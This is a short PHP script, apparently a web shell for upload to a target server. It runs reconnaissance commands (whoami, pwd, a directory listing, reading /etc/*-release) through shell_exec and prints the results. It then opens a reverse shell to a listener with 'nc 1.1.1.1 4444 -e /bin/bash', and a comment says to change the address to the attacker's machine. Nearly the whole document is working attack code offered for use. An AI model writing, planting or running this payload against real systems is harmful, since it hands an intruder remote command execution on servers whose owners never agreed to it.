<?php

function executeCommand($command) {
    $output = shell_exec("$command  2>&1");
    echo "<pre>$command\n$output</pre>";
}

executeCommand('whoami');
executeCommand('pwd');
executeCommand('ls -altr');
executeCommand('cat /etc/*-release');

// CHANGE TO IP AND PORT OF LISTNER MACHINE
executeCommand('nc 1.1.1.1 4444 -e /bin/bash');
?>
